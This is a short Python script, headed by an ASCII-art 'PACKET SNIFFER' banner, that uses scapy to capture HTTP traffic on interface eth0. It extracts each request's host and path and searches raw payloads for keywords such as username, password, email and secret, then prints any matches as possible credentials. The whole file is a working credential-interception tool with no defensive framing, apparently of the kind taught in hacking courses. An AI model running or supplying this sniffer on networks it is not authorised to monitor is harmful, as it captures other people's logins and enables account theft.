#!/usr/bin/env python

# ██████╗░░█████╗░░█████╗░██╗░░██╗███████╗████████╗░░░░░░░░██████╗███╗░░██╗██╗███████╗███████╗███████╗██████╗░
# ██╔══██╗██╔══██╗██╔══██╗██║░██╔╝██╔════╝╚══██╔══╝░░░░░░░░██╔════╝████╗░██║██║██╔════╝██╔════╝██╔════╝██╔══██╗
# ██████╔╝███████║██║░░╚═╝█████═╝░█████╗░░░░░██║░░░░░░░░░░░╚█████╗░██╔██╗██║██║█████╗░░█████╗░░█████╗░░██████╔╝
# ██╔═══╝░██╔══██║██║░░██╗██╔═██╗░██╔══╝░░░░░██║░░░░░░░░░░░░╚═══██╗██║╚████║██║██╔══╝░░██╔══╝░░██╔══╝░░██╔══██╗
# ██║░░░░░██║░░██║╚█████╔╝██║░╚██╗███████╗░░░██║░░░░░░░░░░░██████╔╝██║░╚███║██║██║░░░░░██║░░░░░███████╗██║░░██║
# ╚═╝░░░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚══════╝░░░╚═╝░░░░░░░░░░░╚═════╝░╚═╝░░╚══╝╚═╝╚═╝░░░░░╚═╝░░░░░╚══════╝╚═╝░░╚═╝

import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=proc_sniffer_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["username", "user", "login", "password", "pass", "email", "secret"]
        print(packet)
        for keyword in keywords:
            if keyword in load:
                return load


def proc_sniffer_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        login_info = get_login_info(packet)
        if login_info:
            print("[+] HTTP Request >> : " + str(url))
            print("█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗")
            print("╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝")
            print("[+] Possible username/password" + login_info)
            print("█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗")
            print("╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝")


sniff("eth0")
